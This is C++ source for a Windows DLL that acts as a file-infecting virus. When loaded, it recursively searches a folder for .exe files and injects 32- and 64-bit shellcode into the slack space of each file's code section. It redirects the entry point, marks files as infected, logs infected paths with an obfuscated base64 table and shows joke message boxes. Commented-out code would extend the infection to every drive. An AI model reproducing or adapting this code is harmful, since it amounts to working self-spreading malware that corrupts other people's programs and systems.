// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <stdio.h>
#include <Shlwapi.h>
#include <math.h>
#include <Windows.h>
#include <ctime>


static char b64table[66] = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm5678901234+/=";
static char un64table[128] = { 65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,62,65,65,65,63,57,58,59,60,61,52,53,54,55,56,65,65,65,65,65,65,65,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,65,65,65,65,65,65,39,40,41,42,43,44,45,
46,47,48,49,50,51,26,27,28,29,30,31,32,33,34,35,36,37,38,65 };

char * b64decode(char *text, int len) {

	char *r = (char *)malloc(len);
	ZeroMemory(r, len);
	int i, padding = 0;

	for (i = 0;i<len - 3;i += 4) {



		*r++ = (un64table[text[i]] << 2) | ((un64table[text[i + 1]]) >> 4);

		if (text[i + 2] == '=') {
			padding = 2;
			break;
		}

		*r++ = ((un64table[text[i + 1]] & 0x0f) << 4) | ((un64table[text[i + 2]]) >> 2);

		if (text[i + 3] == '=') {
			padding = 1;
			break;
		}

		*r++ = ((un64table[text[i + 2]] & 0x03) << 6) | ((un64table[text[i + 3]]));

	}
	*r++ = '\0';
	int length = ((len)* 3 / 4) - padding;

	return r - length - 1;
}
char * b64encode(char *text, int len) {
	int i;
	int newlen = len % 3 ? 4 * (len - len % 3) / 3 + 4 : 4 * len / 3;
	//printf("newlen: %d\n",newlen);
	char *p = (char *)(malloc(newlen + 1));


	for (i = 0;i<len - 2;i += 3) {
		//first thing
		*p++ = b64table[((text[i] & 0xfc)) >> 2];
		//second thing
		*p++ = b64table[((text[i] & 0x3) << 4) | ((int)((text[i + 1] & 0xf0) >> 4))];
		//indenting comments
		*p++ = b64table[((text[i + 1] & 0xf) << 2) | ((int)((text[i + 2] & 0xc0) >> 6))];
		//is fun
		*p++ = b64table[(text[i + 2] & 0x3f)];
		//(hmmm)
	}

	if (i<len) {
		*p++ = b64table[((text[i] & 0xfc)) >> 2];
		if (i == len - 1) {
			*p++ = b64table[(text[i] & 0x3) << 4];
			*p++ = '=';
		}
		else {
			*p++ = b64table[((text[i] & 0x3) << 4) | ((int)((text[i + 1] & 0xf0) >> 4))];
			*p++ = b64table[((text[i + 1] & 0xf) << 2)];
		}
		*p++ = '=';

	}

	*p++ = '\0';




	return p - newlen - 1;
}
int infectPE(WCHAR * path) {
	HANDLE hMapObject, hFile;
	LPVOID lpBase;
	int result = -1;

	BYTE * shellcode;

	BYTE shellcode64[273] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc8,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x33,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x33,0xc9,0x48,0x33,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x44,0x3,0xc8,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x3,0xc2,0x66,0x81,0x78,0x18,0xb,0x2,0x75,0x72,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x3,0xc2,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x4c,0x3,0xc2,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x3,0xf2,0x4d,0x33,0xc9,0x48,0x33,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x44,0x3,0xc8,0x3a,0xc4,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x3b,0xca,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x4c,0x3,0xc2,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x4c,0x3,0xc2,0x41,0x8b,0x4,0x88,0x48,0x3,0xc2,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4f,0xff,0xff,0xff,0x5d,0x54,0x67,0x48,0x8d,0x8d,0xdb,0x0,0x0,0x0,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0xc3,0x43,0x3a,0x5c,0x5c,0x6f,0x6b,0x2e,0x64,0x6c,0x6c,0x0 };
	BYTE shellcode32[110] = { 0x33, 0xdb, 0x64, 0x8b, 0x1d, 0x30, 0x0, 0x0, 0x0, 0x8b, //works
		0x5b, 0xc, 0x8b, 0x5b, 0x14, 0x8b, 0x1b, 0x8b, 0x1b, 0x8b,
		0x5b, 0x10, 0x3e, 0x8b, 0x53, 0x3c, 0x3e, 0x8b, 0x54, 0x1a,
		0x78, 0x3e, 0x8b, 0x44, 0x1a, 0x1c, 0x3e, 0x8b, 0x54, 0x1a,
		0x20, 0x3, 0xd3, 0x3, 0xc3, 0x68, 0x61, 0x72, 0x79, 0x41, 0x68
		, 0x4c, 0x69, 0x62, 0x72, 0x68, 0x4c, 0x6f, 0x61, 0x64, 0x54
		, 0x36, 0x8b, 0x34, 0x24, 0x26, 0x8b, 0x3a, 0x3, 0xfb, 0xb9
		, 0xc, 0x0, 0x0, 0x0, 0xf3, 0xa6, 0x74, 0x8, 0x83, 0xc0,
		0x4, 0x83, 0xc2, 0x4, 0xeb, 0xe6, 0x3e, 0x8b, 0x10, 0x3, 0xd3
		, 0x68, 0x6c, 0x6c, 0x0, 0x0, 0x68, 0x6f, 0x6b, 0x2e, 0x64,
		0x68, 0x43, 0x3a, 0x5c, 0x5c, 0x54, 0xff, 0xd2 };
	int spaces = 0;
	//temp
	BYTE jmpcode[5] = { 0xe9,0,0,0,0 };//replaced with new entry point when place is found.
	BYTE sig[2] = { 0x2a,0x00 };//remember endianness change in file^^
	BYTE newep[4];
	int i, shellcodesize, count, offsomething, diff;
	hFile = CreateFile(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if ((hFile == INVALID_HANDLE_VALUE) || !hFile)
		return result;
	hMapObject = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
	lpBase = (LPBYTE)MapViewOfFile(hMapObject, FILE_MAP_ALL_ACCESS, 0, 0, 0);

	PIMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS ntHeader;
	IMAGE_OPTIONAL_HEADER optHeader;
	PIMAGE_SECTION_HEADER sec;
	DWORD jmpto;
	dosHeader = (PIMAGE_DOS_HEADER)lpBase;

	if (!(dosHeader->e_oemid == 0x002a)) {


		//printf("\npeheader offset: %x",dosHeader->e_lfanew);
		//printf("\npe: %x",*((BYTE *)lpBase+dosHeader->e_lfanew+40));
		ntHeader = (PIMAGE_NT_HEADERS)((DWORD)(dosHeader)+(dosHeader->e_lfanew));
		optHeader = ntHeader->OptionalHeader;
		if (optHeader.Magic == 0x20b) {
			//printf("\n64bit");
			shellcode = shellcode64;
			shellcodesize = sizeof(shellcode64);
			spaces = 16;
		}
		else {
			//printf("\n32bit");
			shellcode = shellcode32;
			shellcodesize = sizeof(shellcode32);
			spaces = 4;
		}



		//printf("\nentrypoint: %x",optHeader.AddressOfEntryPoint);




		for (sec = IMAGE_FIRST_SECTION(ntHeader), i = 0;i<ntHeader->FileHeader.NumberOfSections; i++, sec++) {
			////printf("\nsec pointer: %x\n next pointer: %x",sec->PointerToRawData ,(sec + 1)->PointerToRawData);
			if (!(sec->Characteristics & 0x20000020)) {
				//printf("\nnot code: %s",(sec->Name));
				continue;
			}
			if ((sec + 1)->PointerToRawData <= sec->PointerToRawData + shellcodesize + sec->Misc.VirtualSize) {
				//printf("\nterribleh! no place in end of code section");
				printf("bad");
				continue;
			}

			//printf("\ncode: %s\n",(sec->Name));
			count = 0;

			//printf("\nfilealign:%x\nimgbase:%x\nheadersize:%x\n",optHeader.FileAlignment,optHeader.ImageBase,optHeader.SizeOfHeaders);




			offsomething = sec->Misc.VirtualSize + sec->PointerToRawData;
			//offsomething=j-shellcodesize+spaces;//extra +spaces, test
			//printf("\noffsomething: %x",offsomething);
			//printf("\noffsomething+=%d",offsomething%2);
			//offsomething+=offsomething%2;


			diff = sec->VirtualAddress + sec->Misc.VirtualSize;
			printf("cool");
			//printf("\ncoolstuff\nnew: %08x\nva; %x\nsize:%x\n",diff,sec->VirtualAddress,sec->Misc.VirtualSize);

			jmpto = optHeader.AddressOfEntryPoint - 5 - shellcodesize - (diff);
			//printf("\njmp distance: %08x",jmpto);
			jmpcode[1] = (BYTE)((jmpto)& 0xff);
			jmpcode[2] = (BYTE)((jmpto >> 8) & 0xff);
			jmpcode[3] = (BYTE)((jmpto >> 16) & 0xff);
			jmpcode[4] = (BYTE)((jmpto >> 24) & 0xff);

			newep[0] = (BYTE)((diff)& 0xff);
			newep[1] = (BYTE)(((diff) >> 8) & 0xff);
			newep[2] = (BYTE)(((diff) >> 16) & 0xff);
			newep[3] = (BYTE)(((diff) >> 24) & 0xff);

			memcpy((BYTE *)lpBase + offsomething, shellcode, shellcodesize);
			memcpy((BYTE *)lpBase + offsomething + shellcodesize, jmpcode, 5);
			memcpy((BYTE *)lpBase + dosHeader->e_lfanew + 40, newep, 4);
			memcpy((BYTE *)lpBase + 0x24, sig, 2);
			result = 0;
			break;







		}

	}
	else {
		result = 1;
	}

	FlushViewOfFile(hMapObject, 0);
	UnmapViewOfFile(hMapObject);
	FlushFileBuffers(hFile);
	CloseHandle(hMapObject);
	CloseHandle(hFile);
	return result;
}
void recurseInfect(WCHAR * path, int infcount) {
	//MessageBoxW(NULL,path,L"recurseinfect",NULL);
	WIN32_FIND_DATA ffd;
	int res;

	char * cn = getenv("COMPUTERNAME");
	char *logfile = (char *)malloc(MAX_PATH);
	sprintf(logfile, "C:\\stuff\\infectablefolder\\%s\x00", b64encode(cn, strlen(cn)));
	char * encpath = (char *)malloc(MAX_PATH);
	HANDLE hFind = INVALID_HANDLE_VALUE;
	WCHAR temp[MAX_PATH];
	WCHAR newpath[MAX_PATH];
	ZeroMemory(temp, MAX_PATH);
	ZeroMemory(newpath, MAX_PATH);
	wcscat(temp, path);
	wcscat(temp, L"\\*");

	hFind = FindFirstFile(temp, &ffd);


	if (hFind == INVALID_HANDLE_VALUE)
		return;
	do
	{
		ZeroMemory(newpath, MAX_PATH);

		//MessageBoxW(NULL,ffd.cFileName,L"iter",NULL);
		if (!wcsicmp(ffd.cFileName, L".") || !wcsicmp(ffd.cFileName, L"..")) {
			//MessageBoxW(NULL,ffd.cFileName,L"same!",NULL);
			continue;
		}

		else {
			wcscat(newpath, path);
			wcscat(newpath, L"\\");
			wcscat(newpath, ffd.cFileName);
			if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {//if is a directory



																  //MessageBoxW(NULL,newpath,L"new dir!",NULL);
				recurseInfect(newpath, infcount);
			}

			else {//is a file!
				  //MessageBoxW(NULL,PathFindExtension(ffd.cFileName),L"TEST",NULL);
				if (wcsicmp(PathFindExtension(ffd.cFileName), L".exe") == 0) {

					//MessageBoxW(NULL,ffd.cFileName,L"infecting file>>",NULL);
					res = infectPE(newpath);
					if (res>0) {
						infcount++;//might need this to actually be a thing?

						if (infcount >= 5) {//assume this folder was infected before
							break;
						}
					}
					else if (res == 0) {

						FILE * cool = fopen(logfile, "a");
						ZeroMemory(encpath, MAX_PATH);
						wcstombs(encpath, newpath, wcslen(newpath));
						//MessageBoxW(NULL,L"THING",L"TEST",NULL);
						fputs(b64encode(encpath, strlen(encpath)), cool);
						fputs("\n", cool);
						fclose(cool);
					}
					else {

					}


				}

			}

		}

	} while (FindNextFile(hFind, &ffd));
	FindClose(hFind);

}

void startinf() {
	HANDLE mutex = CreateMutexW(NULL, 0, L"veryOkay");

	if (!mutex) {
		return;
	}
	/*
	BYTE drives=GetLogicalDrives();
	WCHAR *path=(WCHAR *)malloc(2);

	for(char i='a';i<='z';i++){
	if((drives & (int)pow(2.0,i-97)))
	swprintf(path,L"%c:",i);
	recurseInfect(path,0);
	}
	recurseInfect(".",0);
	*/
	//later change to this, now just for testing:

	recurseInfect(L"\\\\localhost\\C$\\stuff\\infectablefolder", 0);



	ReleaseMutex(mutex);
}

void dothings() {
	FILE * signal = fopen("C:\\stuff\\infectablefolder\\thumbs.db", "r"); //
	if (signal) {
		fclose(signal);
		time_t t;
		srand(time(&t));
		const WCHAR *titles[30] = { L"such title",L"indeed",L"sistemshloshimveshtaim",L"descriptive title",L"nope",L"hurray?",L".--...--.----..-..-....--.----..", L"hi!", L"0x2a", L"clear and concise title", L"tr0llolol",
			L"it is known", L"weee", L"bother!",L"shalom rav", L"Shlomot!", L"Sounds about right", L"'\\n'.join(['wow','such msg box','amaze'])",
			L"aha!", L"how rude!", L"2b || !2b", L"yup", L"it shall be done", L"1 2 4 8 16 32 64 127 watO:", L"not a title", L"this is a cat",L"morning!",L"okay",L"attempt at conveying meaningful messages", L"great success" };
		const WCHAR *messages[30] = { L"hello to you, person!",L"this message box is a message box is a message box is a message box",L"nope:(",L"excuse me comma what is the time question mark",
			L"press ok to continue(???)", L"things, stuff, etc.", L"Pliz Aktiveit yor copi off Microsoft Windows", L"nobody expects the spanish inquisition", L"not a reference!",
			L"dabelyudabelyudabelyunekudagooglenekudacom", L"please confirm to confirm", L"attention! the gangster may use the english operation interface to cheat you", L"not enough computer for computering:(:(", L"many greetings!",
			L"The bad computer is experienced, a better computer is purchased and this application run the second time.", L"veri gud messege", L"nop nop nop", L"0x90 0x90 0x90 0x90", L"attention! this message is(yes??).",
			L"'\\n'.join(map(lambda x: 'push 0x'+''.join([('%02x' % ord(i)) for i in x][::-1]), ['trollololol!'[i:i+4] for i in range(0,len('trollololol!'),4)])[::-1])+'\\npush esp'",
			L"Ni!", L"a shrubbery!", L"hello exclamation mark exclamation mark exclamation mark", L"Yoo sholl note pas", L"it shall be done", L"hurray indeed?", L"repetitive blabbering ensues", L"not spam:(",
			L"please mind the gap", L"happy new year" };
		int title = rand() % sizeof(titles) / 4, msg = rand() % sizeof(messages) / 4;
		FILE *trr = fopen("C:\\stuff\\infectablefolder\\asdf.log", "w");
		fputs("123", trr);
		fclose(trr);
		MessageBox(NULL, messages[msg], titles[title], NULL);
	}



}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	DWORD result = 0;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//MessageBox(NULL,L"attached to process",L"hurray",NULL);
		startinf();
		dothings();
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)startinf, 0, 0, &result);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dothings, 0, 0, &result);

		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


int lol() {
	return 1;
}
